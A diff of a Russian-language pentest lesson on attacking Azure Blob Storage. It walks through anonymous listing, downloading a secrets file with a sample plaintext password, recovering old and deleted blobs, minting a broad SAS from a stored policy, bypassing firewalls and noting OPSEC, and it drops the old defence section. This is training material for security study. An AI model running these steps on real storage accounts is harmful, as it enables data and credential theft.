@@ -15,172 +15,155 @@ estimated_minutes: 50
 summary: "Azure Blob: уровни доступа (private/blob/container), account vs service SAS, stored access policies, версии, soft-delete и immutable. Как читать и восстанавливать данные."
 ---
 
-## Зачем этот урок
+## Задача
 
-Azure Blob Storage — крупнейшее объектное хранилище Azure. В отличие от простого «бакета», у него богатая модель доступа: уровни публичного доступа, несколько типов SAS, stored access policies, сетевые ограничения, версионирование и soft-delete. Именно из-за гибкости здесь чаще всего встречаются мисконфиги: контейнер `Blob`-уровня с чувствительными файлами, account-level SAS с широкими правами, открытые stored access policies. Для атакующего важно уметь и читать данные, и восстанавливать «удалённое», и обходить сетевые ограничения.
+Ты нашёл в Azure аккаунт хранилища **Blob Storage** — объектное хранилище, аналог «бакета». Как понять, что из него можно прочитать, и как достать данные, даже если часть из них «удалена»? В отличие от простого бакета, у Blob богатая модель доступа: уровни публичности, несколько типов **SAS**, версии и soft-delete. Именно из-за гибкости здесь чаще всего встречаются мисконфиги. Задача урока — научиться читать, восстанавливать и обходить сетевые ограничения.
 
-## Модель доступа Blob
+## Что такое Blob и его модель доступа
 
-- **Public access level**: `Private` (по умолчанию), `Blob` (анонимное чтение отдельных blob'ов), `Container` (анонимный listing + чтение).
-- **SAS (Shared Access Signature)**: user delegation (Entra ID), service (на сервис), account (на весь аккаунт). Параметры: ресурсы (`s`ervice/`c`ontainer/`o`bject), права (`r`/`w`/`d`/`l`/`a`/`c`), срок, IP.
-- **Stored access policy**: именованная политика на контейнер, на которую ссылается SAS; позволяет отзывать доступ.
-- **Networking**: `publicNetworkAccess`, firewall (selected networks), private endpoints.
-- **Versioning / soft-delete / immutable (WORM)**: хранение версий и удалённых blob'ов.
+**Blob** — один объект (файл) в контейнере. **Контейнер** — группа blob'ов. Аккаунт хранилища содержит контейнеры.
 
-Ключевые права RBAC: `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read`, `.../write`, `listKeys`, `listServiceSas`.
+Уровни публичного доступа контейнера:
 
-## Инструменты и команды
+- `Private` (по умолчанию) — нужна авторизация.
+- `Blob` — анонимно читаются отдельные blob'ы, если знаешь имя.
+- `Container` — анонимно доступен и **листинг** всех blob'ов, и чтение.
 
-```bash
-# Инвентаризация аккаунтов и контейнеров
-az storage account list --query '[].{Name:name,RG:resourceGroup,Public:allowBlobPublicAccess}' --output table
-az storage container list --account-name mystorage --auth-mode login -o table
+**SAS (Shared Access Signature)** — подписанная ссылка, дающая ограниченный доступ. Бывает:
 
-# Уровень доступа контейнера
-az storage container show-permission --name public --account-name mystorage --auth-mode login
-# "publicAccess": "container"
+- **User delegation** — подписана Entra ID, до 7 дней, отзывается.
+- **Service** — подписана ключом аккаунта, на один сервис.
+- **Account** — самый широкий, на весь аккаунт и все сервисы.
+- **Stored access policy** — именованная политика на контейнер, на которую ссылается SAS; её можно отозвать.
 
-# Анонимное чтение (без кредов)
-curl -s "https://mystorage.blob.core.windows.net/public/config.json" | head
-curl -s "https://mystorage.blob.core.windows.net/public?restype=container&comp=list" | head -c 300
+Плюс **версионирование** (хранит старые версии объектов), **soft-delete** (хранит удалённые) и **immutable/WORM** (запрещает изменение). Ключевые права RBAC: `.../blobs/read`, `.../write`, `listKeys`, `listServiceSas`.
 
-# SAS: получить/сгенерировать
-az storage container generate-sas --name data --account-name mystorage \
-  --permissions racwdl --expiry 2030-01-01 --auth-mode login
+## Данные, с которыми работаем
 
-# Список ключей аккаунта (если есть права)
-az storage account keys list --account-name mystorage --query '[].value'
-```
-
-## Разобранный пример: контейнер Container-уровня → данные и SAS
-
-Сценарий: контейнер `backups` имеет публичный доступ `container`.
+Инвентаризация аккаунтов и проверка публичности:
 
 ```bash
-# 1. Листинг без аутентификации
-curl -s "https://mystorage.blob.core.windows.net/backups?restype=container&comp=list" \
-  | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g'
-# db-backup-2024-03-01.sql
-# secrets.env
-# app-config.json
-
-# 2. Скачиваем секреты
-curl -s "https://mystorage.blob.core.windows.net/backups/secrets.env" -o secrets.env
-cat secrets.env
-# DB_CONNECTION=...
-# STORAGE_KEY=...
-
-# 3. Если включено версионирование — смотрим версии
-curl -s "https://mystorage.blob.core.windows.net/backups/secrets.env?comp=versions" | head
-
-# 4. Восстанавливаем удалённый blob (soft-delete)
-curl -s -X PUT "https://mystorage.blob.core.windows.net/backups/secrets.env?comp=undelete&timeout=30"
+$ az storage account list --query '[].{Name:name,Public:allowBlobPublicAccess}' -o table
+Name        Public
+----------  --------
+mystorage   True
 ```
 
-Даже если blob «удалён», soft-delete (по умолчанию включён, 7 дней) позволяет его вернуть. Версии дают доступ к прошлым значениям секретов, которые ротировали. Проверяйте оба механизма.
+`allowBlobPublicAccess=True` — публичный доступ разрешён. Смотрим контейнеры:
 
-## Типы SAS и их злоупотребление
+```bash
+$ az storage container list --account-name mystorage --auth-mode login -o table
+Name      PublicAccess
+--------  --------------
+backups   container
+```
 
-| Тип SAS | Область | Особенность |
-|---|---|---|
-| User delegation | Entra ID, до 7 дней | Без ключа аккаунта; отзывается |
-| Service | Сервис (blob/file/queue/table) | Подписан ключом аккаунта |
-| Account | Весь аккаунт | Самый широкий; может включать все сервисы |
-| Stored access policy | Контейнер | Позволяет отзывать через политику |
+Контейнер `backups` имеет уровень `container` — анонимный листинг. Это цель.
 
-Account SAS с правами `rwdlacup` на все сервисы — фактически ключ ко всему аккаунту. Если такой SAS утёк (в логах, JS, мобильном приложении) — атакующий читает и пишет всё. Проверяйте `signedServices`, `signedResourceTypes`, `signedPermission` в утёкшей ссылке.
+## Шаг 1: анонимный листинг
+
+```bash
+$ curl -s "https://mystorage.blob.core.windows.net/backups?restype=container&comp=list" \
+    | grep -oE '<Name>[^<]+</Name>' | sed 's/<[^>]*>//g'
+db-backup-2024-03-01.sql
+secrets.env
+app-config.json
+```
+
+Три файла. Имена говорящие: дамп базы и файл с секретами.
+
+## Шаг 2: скачиваем секреты
+
+```bash
+$ curl -s "https://mystorage.blob.core.windows.net/backups/secrets.env" -o secrets.env
+$ cat secrets.env
+DB_CONNECTION=Server=prod-sql.database.windows.net;User=sqladmin;Password=Pr0d_P@ss!
+STORAGE_KEY=7f3a9...==
+```
+
+Мы получили строку подключения к БД и ключ другого хранилища. Ключ `STORAGE_KEY` позволяет подписывать свои SAS — то есть двигаться дальше.
+
+## Шаг 3: версии и soft-delete
+
+Допустим, секрет уже «ротировали» и перезаписали. Но если включено версионирование, старые значения остались:
+
+```bash
+$ curl -s "https://mystorage.blob.core.windows.net/backups/secrets.env?comp=versions" | grep -oE '<VersionId>[^<]+' | head
+<VersionId>2024-02-01T10:00:00.0000000Z
+```
+
+Читаем старую версию (в URL добавляется `versionid`). А если blob **удалили**, при включённом soft-delete (по умолчанию 7 дней) его можно вернуть:
+
+```bash
+$ curl -s -X PUT "https://mystorage.blob.core.windows.net/backups/secrets.env?comp=undelete&timeout=30"
+```
+
+Проверяй оба механизма: версии дают прошлые секреты, soft-delete — удалённые.
+
+## Шаг 4: stored access policy
+
+Иногда доступа «в лоб» нет, но есть **stored access policy** с широкими правами и длинным сроком — по сути ключ к контейнеру на годы:
+
+```bash
+$ az storage container policy list --container-name data --account-name mystorage --auth-mode login
+{"full-policy":{"permissions":"racwdl","expiry":"2030-01-01"}}
+$ az storage container generate-sas --name data --account-name mystorage \
+    --policy-name full-policy --auth-mode login
+se=2030-01-01&sp=racwdl&sv=...&sig=...
+```
+
+`racwdl` — read/add/create/write/delete/list. Отозвать такой доступ можно только изменением политики, что требует прав на контейнер.
+
+## Полный прогон от начала до конца
+
+1. `az storage account list` → `allowBlobPublicAccess=True`.
+2. `az storage container list` → `backups` уровня `container`.
+3. Анонимный листинг → `secrets.env`, дамп БД.
+4. Скачали `secrets.env` → строка подключения к БД и `STORAGE_KEY`.
+5. `comp=versions` / `comp=undelete` → прошлые и удалённые секреты.
+6. Ключом `STORAGE_KEY` подписали SAS → доступ к другим контейнерам.
+
+## Если не сработало
+
+- **Public access выключен.** `allowBlobPublicAccess=False` — анонимного чтения нет, нужен SAS или ключ.
+- **Private endpoint / firewall.** Даже валидный SAS вернёт ошибку, если ваш IP не разрешён — нужен пивот в VNet.
+- **Trusted Azure services.** Некоторые сервисы (Azure Backup, Logic Apps) ходят в Storage в обход firewall — это confused deputy, ищи доступ через них.
+- **Уровень `Blob`.** Листинга нет, но отдельный blob читается, если знаешь точное имя — перебирай типовые имена.
+- **Account SAS утёк.** Проверь в ссылке `signedServices`, `signedResourceTypes`, `signedPermission` — account SAS с `rwdlacup` на всё это ключ ко всему аккаунту.
+- **Иммутабельность.** Retention/legal hold мешают удалить, но не читать; помни, что твои перезаписи оставляют версии — след в логах.
 
 ## Обход сетевых ограничений
 
-- **Public network access disabled + private endpoint.** Из интернета доступа нет; нужен пивот в VNet. SAS тоже не поможет, если firewall блокирует ваш IP.
-- **Firewall (selected networks).** Разрешённые сети/IP; иногда в списке есть `0.0.0.0/0` или админский диапазон.
-- **Trusted Azure services.** Некоторые сервисы (Azure Backup, Logic Apps) ходят в Storage в обход firewall — это confused deputy.
-- **Private endpoint.** Доступ только из VNet; проверяйте DNS-резолв (`*.privatelink.blob.core.windows.net`).
+Если `publicNetworkAccess` выключен и стоит private endpoint, из интернета доступа нет — нужен пивот в VNet, и SAS тут не поможет. Проверяй правило firewall:
 
 ```bash
-az storage account show --name mystorage --query '{net:networkRuleSet,public:publicNetworkAccess}'
+$ az storage account show --name mystorage --query '{net:networkRuleSet,public:publicNetworkAccess}'
+{"net":{"defaultAction":"Deny","ipRules":[...]},"public":null}
 ```
 
-## Чек-лист атаки
+Иногда в `ipRules` встречается широкий диапазон или `0.0.0.0/0`. Отдельный приём — **trusted Azure services**: сервисы вроде Azure Backup или Logic Apps ходят в Storage в обход firewall. Если ты можешь заставить такой сервис прочитать blob (confused deputy), сеть тебя не остановит.
 
-1. `allowBlobPublicAccess` и уровни контейнеров.
-2. Анонимный listing/чтение.
-3. Утёкшие SAS (account/service/user delegation).
-4. Stored access policies (можно ли использовать/отозвать).
-5. Версии и soft-delete.
-6. Сетевые ограничения и private endpoints.
-7. Ключи аккаунта (`listKeys`) — если есть права, генерируйте SAS сами.
+## Сравнение с AWS S3
 
-## Частые ошибки и подводные камни
+У S3 и Blob похожая логика, но разные механизмы: в S3 делегированный доступ — это presigned URL, а публичность задаётся bucket policy/ACL; в Azure — SAS с явными правами и уровни контейнера. У S3 нет «account-level» presigned URL, а в Azure **account SAS** покрывает все сервисы сразу — это делает его утечку особенно опасной. Зато в Azure нет аналога bucket policy, и публичность видна проще: достаточно посмотреть `publicAccess` контейнера.
 
-- Считать `Blob`-уровень «безопасным»: отдельные blob'ы читаются анонимно, если имя известно.
-- Не проверить soft-delete/versioning: «удалённое» часто доступно.
-- Путать account SAS и service SAS по объёму прав.
-- Игнорировать stored access policies: они позволяют отзывать доступ, но и злоупотреблять.
-- Забыть про firewall: SAS без доступа к сети бесполезен.
+## Что мы теперь знаем
 
-## Защита и детект
+- `Container`-уровень = анонимный листинг и чтение; `Blob` — только чтение известных имён.
+- Типы SAS различаются по охвату: account шире service; user delegation отзывается.
+- Stored access policy с `racwdl` и сроком до 2030 — фактически ключ.
+- Версии и soft-delete возвращают «старые» и «удалённые» секреты.
+- Firewall/private endpoint блокируют доступ независимо от SAS.
 
-- Запретить публичный доступ (`allowBlobPublicAccess=false`) и включить `publicAccessPrevention`.
-- Использовать user delegation SAS с коротким сроком и stored access policies.
-- Ограничить сеть (private endpoints, firewall), включить `defaultAction=Deny`.
-- Включить versioning, soft-delete и immutable для критичных данных.
-- Ограничить `listKeys`/`listServiceSas`; включить Storage analytics/diagnostic logs и алертить.
+## На что смотреть дальше
 
-## Модель угроз и типовые мисконфиги
-
-Типичный мисконфиг — контейнер `Container`-уровня с данными. Второй — account SAS на 5 лет в клиенте. Третий — секреты в blob'ах. Четвёртый — `0.0.0.0/0` в firewall. Пятый — soft-delete без контроля. Все они ведут к утечке данных и ключей.
-
-## Практическое задание
-
-1. Создайте аккаунт, контейнер `Container`-уровня и прочитайте blob анонимно.
-2. Сгенерируйте service SAS на чтение и используйте его.
-3. Включите versioning, перезапишите blob и прочитайте старую версию.
-4. Включите firewall и убедитесь, что анонимный доступ блокируется.
-
-## Что дальше / решение
-
-Из Blob достаём данные и ключи. Дальше — использовать найденные SAS/ключи. Зафиксируйте путь «публичный контейнер/версия → данные» в графе. При private endpoint без пивота — `blocked`.
-
-## Разобранный пример 2: stored access policy и отзыв
-
-Stored access policy — именованная политика на контейнере, на которую ссылается SAS. Она позволяет отзывать доступ, меняя политику. Но если политика разрешает широкие права, ей можно злоупотребить.
-
-```bash
-# Список stored access policies контейнера
-az storage container policy list --container-name data --account-name mystorage --auth-mode login
-# {"read-policy":{"permissions":"r","expiry":"2030-01-01"},"full-policy":{"permissions":"racwdl","expiry":"2030-01-01"}}
-
-# Генерируем SAS на основе политики
-az storage container generate-sas --name data --account-name mystorage \
-  --policy-name full-policy --auth-mode login
-# se=2030-01-01&sp=racwdl&sv=...&sig=...
-
-# Используем SAS
-curl "https://mystorage.blob.core.windows.net/data/config.json?se=2030-01-01&sp=racwdl&sv=...&sig=..." | head
-```
-
-Если политика `full-policy` имеет права `racwdl` (read/add/create/write/delete/list) и срок до 2030 — по сути это ключ ко всему контейнеру на годы. Отзыв возможен только изменением/удалением политики, что требует прав на контейнер. Проверяйте, нет ли политик с длинным сроком и широкими правами, и есть ли у вас право их менять.
-
-## Иммутабельность, retention и восстановление
-
-Immutable storage (WORM) и retention policies защищают данные от удаления, но их тоже нужно понимать.
-
-```bash
-# Проверяем immutable policy и retention
-az storage container immutability-policy show --container-name data --account-name mystorage 2>/dev/null
-az storage container legal-hold show --container-name data --account-name mystorage 2>/dev/null
-
-# Восстановление удалённого контейнера (soft-delete на уровне контейнера)
-az storage container restore --name data --deleted-version 01DA... --account-name mystorage
-
-# Список удалённых контейнеров
-az storage container list --include-deleted --account-name mystorage
-```
-
-Retention policy может запрещать удаление объектов до определённого срока — это защита целостности, но также означает, что ваши изменения останутся в истории. Legal hold блокирует удаление до снятия. Для атакующего важно: если включён versioning, ваши перезаписи создают новые версии, а старые сохраняются — следы остаются. Учитывайте это в OPSEC.
+- **cloud-azure-storage-sas**: устройство SAS и генерация ссылок.
+- **cloud-terraform-state**: state-файлы часто лежат в Blob и содержат креды.
+- **cloud-exfiltration**: как вывозить найденные данные.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Чем уровень доступа Container отличается от Blob?"
@@ -215,7 +198,19 @@ Retention policy может запрещать удаление объектов
     - "SAS требует MFA"
   answer: 0
   explanation: "Firewall/private endpoint ограничивают сеть независимо от SAS."
+- question: "Какой SAS самый широкий по охвату?"
+  options:
+    - "Account SAS — на весь аккаунт и все сервисы"
+    - "Service SAS"
+    - "User delegation SAS"
+    - "Stored access policy"
+  answer: 0
+  explanation: "Account SAS может включать все сервисы и типы ресурсов — это ключ ко всему аккаунту."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **SAS-токены** подробнее — как они подписываются, где утекают и как их проверять. А пока главное запомни: **в Blob «удалённое» часто доступно через версии и soft-delete, а один утёкший account SAS равен ключу ко всему аккаунту.**
 
 ## Где пригодится
 
